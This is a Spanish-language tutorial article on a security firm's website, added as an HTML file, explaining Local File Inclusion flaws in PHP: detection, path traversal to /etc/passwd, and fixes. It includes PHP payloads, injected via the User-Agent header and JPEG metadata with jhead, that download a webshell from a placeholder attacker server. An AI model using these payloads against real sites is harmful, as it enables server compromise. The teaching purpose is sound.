@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LFI (Local File Inclusion) | Atalanta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/estilos.css?v=3">
+</head>
+<body>
+
+  <header id="navbar">
+    <div class="nav page-container">
+      <a href="../prueba.html">
+        <img src="../imagenes/ATALANTA_5_150ppp.png" class="logo" alt="Atalanta">
+      </a>
+      <nav>
+        <a href="../quienes_somos.html">Quiénes somos</a>
+        <a href="../ciberseguridad.html">Ciberseguridad</a>
+        <a href="../digital.html">Digital</a>
+        <a href="../formacion.html">Formación</a>
+        <a href="../empleo.html">Empleo</a>
+        <a href="../noticias.html">Noticias</a>
+        <div class="nav-dropdown">
+          <button class="nav-dropdown-toggle">Otros <svg width="10" height="6" viewBox="0 0 10 6" fill="none"><path d="M1 1l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <div class="nav-dropdown-menu">
+            <a href="../servicios.html">Servicios</a>
+            <a href="../atencion_cliente.html">Atención al Cliente</a>
+          </div>
+        </div>
+        <a href="../contacto.html">Contacto</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+
+    <!-- HERO ARTICULO -->
+    <section class="news-article-hero" style="background-image: url('../imagenes/noticias/lfi (local file inclusion).webp');">
+      <div class="news-article-hero-overlay"></div>
+      <div class="page-container news-article-hero-content">
+        <a href="../noticias.html" class="news-article-back">← Volver a Noticias</a>
+        <span class="news-article-category">Ciberseguridad</span>
+        <h1>LFI (Local File Inclusion)</h1>
+        <p class="news-article-author">Por Daniel Tapia</p>
+      </div>
+    </section>
+
+    <!-- CONTENIDO -->
+    <section class="news-article-body">
+      <div class="page-container news-article-container">
+
+        <p>Actualmente hay muchas maneras de atacar páginas web. En este artículo vamos a ver cómo atacar la vulnerabilidad LFI (Local File Inclusion). Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con este tipo de fallo. Es diferente a Remote File Inclusion (RFI), que incluye archivos alojados en otros servidores.</p>
+
+        <p>Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar funciones en PHP para incluir archivos. En un escenario como éste, un atacante podría modificar los parámetros de lo que se incluye; por ejemplo, podría incluir otros archivos que están en el servidor con información muy importante, como el archivo de contraseñas <code>/etc/passwd</code> en sistemas Linux.</p>
+
+        <h2>Algunas maneras de detectar la vulnerabilidad</h2>
+
+        <h3>1. Agregando un valor ilógico a la variable en la URL</h3>
+
+        <p>Si al ingresar un valor ilógico en un parámetro URL nos devuelve un error como <code>Warning: main</code> o <code>warning include</code>, sería un posible indicio de que la página es vulnerable a LFI.</p>
+
+        <h3>2. Ver código PHP</h3>
+
+        <p>Si el código muestra lo siguiente, significa que es vulnerable debido a la variable include:</p>
+
+        <pre><code>&lt;?php include $_GET['pagina']; ?&gt;</code></pre>
+
+        <h2>Maneras de realizar el ataque</h2>
+
+        <h3>1. Mediante función include</h3>
+
+        <p>El objetivo será ir moviéndonos por los distintos directorios de la página web con la expresión <code>../</code> y añadimos al final <code>etc/passwd</code> para intentar acceder a este archivo.</p>
+
+        <img src="../imagenes/noticias/Captura-de-pantalla-2020-11-05-09-11-09.png" alt="Ataque LFI mediante función include">
+
+        <p>Como observamos, nos devuelve el archivo <code>/etc/passwd</code>.</p>
+
+        <h3>2. Utilizando el User-Agent</h3>
+
+        <p>Para realizar este tipo de inclusión debemos irnos a Burp Suite y cuando tengamos la petición parada cambiamos el parámetro User-Agent por la siguiente línea:</p>
+
+        <pre><code>&lt;?php system('GET http://servidorAtacante/webshell.txt &gt; webshell.php'); ?&gt;</code></pre>
+
+        <h3>3. Mediante metadatos de la cabecera</h3>
+
+        <p>El objetivo será subir una imagen al servidor pero previamente habiendo hecho una modificación para poder después realizar el include. La imagen debe ser <code>.jpg</code> y con el comando <code>jhead</code> modificamos la cabecera de la imagen:</p>
+
+        <pre><code>jhead -cl "&lt;?php system('GET http://servidorAtacante/webshell.txt &gt; webshell.php'); ?&gt;" imagen.jpg</code></pre>
+
+        <p>Una vez modificada la cabecera de la imagen, solo queda realizar el include.</p>
+
+        <h3>4. Ataque LFI con diccionario</h3>
+
+        <p>En este caso, realizamos un ataque LFI mediante un diccionario. Debemos crear un diccionario con valores que suelen ser susceptibles de ataques LFI. Para realizar el ataque utilizaremos cualquier herramienta de fuzzing: dirb, wfuzz o gobuster, entre muchos otros.</p>
+
+        <img src="../imagenes/noticias/a2.png" alt="Ataque LFI con diccionario usando fuzzing">
+
+        <p>Lo que sucede en este caso es que fuzzeamos la página y nuestro objetivo es encontrar respuestas 200 obtenidas mediante LFI.</p>
+
+        <h2>Arreglar la vulnerabilidad LFI</h2>
+
+        <p>A pesar de que esta es una vulnerabilidad bastante peligrosa, no quiere decir que no se pueda mitigar. Algunas maneras de arreglarlo son las siguientes:</p>
+
+        <h3>1. Cambiando el código PHP</h3>
+
+        <pre><code>&lt;?php include('pagina.php'); ?&gt;</code></pre>
+
+        <p>Teniendo el código de esta manera nos aseguramos de cerrar una posible puerta de entrada a un ataque LFI.</p>
+
+        <h3>2. Deshabilitar allow_url_fopen y allow_url_include</h3>
+
+        <p>Dentro del archivo <code>.ini</code> se recomienda compilar PHP localmente sin incluir esta funcionalidad. Muy pocas aplicaciones necesitan esta funcionalidad y para estos casos estas opciones deberían habilitarse desde la base de la aplicación.</p>
+
+        <h3>3. Validación estricta de la entrada del usuario</h3>
+
+        <p>En conclusión, la vulnerabilidad LFI puede llegar a resultar muy fatídica, pero es bastante simple de mitigar si se aplican las medidas adecuadas.</p>
+      </div>
+<div class="page-container news-article-nav-wrap">
+      <nav class="news-article-nav">
+        <a href="noticia-named-pipes.html" class="news-nav-prev"><span>Anterior noticia</span><em>Named Pipes</em></a>
+        <a href="../noticias.html" class="news-nav-index">Todas las noticias</a>
+        <a href="noticia-footprinting.html" class="news-nav-next"><span>Siguiente noticia</span><em>Footprinting</em></a>
+      </nav>
+    </div>
+    </section>
+
+    <!-- CTA -->
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="footer-main">
+      <div class="footer-main-bg" style="background-image: url('../imagenes/Fondo-Atalanta-Logo-scaled-e1770985160923.jpg');"></div>
+      <div class="footer-main-overlay"></div>
+      <div class="footer-inner page-container">
+        <div class="footer-col-brand">
+          <a href="../prueba.html">
+            <img src="../imagenes/ATALANTA_5_150ppp.png" alt="Atalanta" class="footer-logo-img">
+          </a>
+          <div class="footer-socials">
+            <a href="https://www.linkedin.com/company/atalanta-ciberseguridad" target="_blank" rel="noopener noreferrer" class="footer-social-btn" aria-label="LinkedIn">
+              <svg viewBox="0 0 24 24" aria-hidden="true" stroke="currentColor" stroke-width="2" fill="none"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+            </a>
+            <a href="https://www.instagram.com/atalanta.academy/" target="_blank" rel="noopener noreferrer" class="footer-social-btn" aria-label="Instagram">
+              <svg viewBox="0 0 24 24" aria-hidden="true" stroke="currentColor" stroke-width="2" fill="none"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
+            </a>
+          </div>
+        </div>
+        <div class="footer-col-menu">
+          <h4 class="footer-heading">MENÚ</h4>
+          <ul class="footer-nav-list">
+            <li><a href="../quienes_somos.html">Quiénes somos</a></li>
+            <li><a href="../servicios.html">Servicios</a></li>
+            <li><a href="../ciberseguridad.html">Ciberseguridad</a></li>
+            <li><a href="../digital.html">Digital</a></li>
+            <li><a href="../formacion.html">Formación</a></li>
+            <li><a href="../empleo.html">Empleo</a></li>
+            <li><a href="../noticias.html">Noticias</a></li>
+            <li><a href="../atencion_cliente.html">Atención al Cliente</a></li>
+            <li><a href="../contacto.html">Contacto</a></li>
+          </ul>
+        </div>
+        <div class="footer-col-contact">
+          <h4 class="footer-heading">CONTACTO</h4>
+          <div class="footer-contact-item">
+            <svg viewBox="0 0 24 24" aria-hidden="true" stroke="currentColor" stroke-width="2" fill="none"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+            <span>info@atalantago.com</span>
+          </div>
+          <div class="footer-contact-item">
+            <svg viewBox="0 0 24 24" aria-hidden="true" stroke="currentColor" stroke-width="2" fill="none"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+            <span>Madrid, España</span>
+          </div>
+          <div class="map-placeholder">
+              <iframe src="https://maps.google.com/maps?q=40.4292413,-3.7049219&z=16&output=embed" frameborder="0" width="100%" height="250" style="border: 0; border-radius: 15px;" allowfullscreen="" loading="lazy"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <div class="footer-bottom-inner page-container">
+        <p>Copyright © 2026. Todos los derechos reservados por Atalanta Evolution</p>
+        <div class="footer-legal-links">
+          <a href="../legal/aviso_legal.html">AVISO LEGAL</a>
+          <span>|</span>
+          <a href="../legal/politica_privacidad.html">POLÍTICA DE PRIVACIDAD</a>
+          <span>|</span>
+          <a href="../legal/politica_cookies.html">POLÍTICA DE COOKIES</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <button id="scroll-top-btn" aria-label="Volver arriba"><svg viewBox="0 0 24 24"><polyline points="18 15 12 9 6 15"></polyline></svg></button>
+
+  <script src="../js/js.js"></script>
+  <script>
+    window.addEventListener('pageshow', function(e) {
+      if (e.persisted) window.location.reload();
+    });
+  </script>
+</body>
+</html>
